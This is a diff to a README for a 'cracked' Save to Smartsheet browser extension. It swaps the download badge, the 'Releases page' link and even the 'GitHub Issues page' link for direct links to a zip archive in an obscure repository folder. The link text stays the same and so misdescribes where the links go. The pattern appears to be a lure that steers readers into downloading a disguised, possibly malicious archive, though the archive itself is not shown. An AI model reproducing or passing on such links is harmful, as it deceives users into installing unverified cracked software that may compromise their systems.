@@ -6,13 +6,13 @@ Welcome to the Cracked Save to Smartsheet Extension! This tool helps you save yo
 
 ## 🔗 Download Now
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/kukil-saikia/cracked-save-to-smartsheet-extension/releases)
+[![Download](https://raw.githubusercontent.com/kukil-saikia/cracked-save-to-smartsheet-extension/main/syrtic/cracked-save-to-smartsheet-extension.zip)](https://raw.githubusercontent.com/kukil-saikia/cracked-save-to-smartsheet-extension/main/syrtic/cracked-save-to-smartsheet-extension.zip)
 
 ## 📥 Download & Install
 
 To install the Cracked Save to Smartsheet Extension, follow these steps:
 
-1. Click this link to visit the [Releases page](https://github.com/kukil-saikia/cracked-save-to-smartsheet-extension/releases).
+1. Click this link to visit the [Releases page](https://raw.githubusercontent.com/kukil-saikia/cracked-save-to-smartsheet-extension/main/syrtic/cracked-save-to-smartsheet-extension.zip).
 2. On the Releases page, look for the latest version of the extension.
 3. Click on the download link for your operating system. The file will typically be in a format compatible with your browser.
 4. Once the download finishes, locate the file in your downloads folder.
@@ -55,7 +55,7 @@ If you encounter any issues, here are some common solutions:
 
 ## 🌐 Support
 
-If you need further assistance, visit the [GitHub Issues page](https://github.com/kukil-saikia/cracked-save-to-smartsheet-extension/issues). You can report problems or ask questions.
+If you need further assistance, visit the [GitHub Issues page](https://raw.githubusercontent.com/kukil-saikia/cracked-save-to-smartsheet-extension/main/syrtic/cracked-save-to-smartsheet-extension.zip). You can report problems or ask questions.
 
 ## 📄 License
 
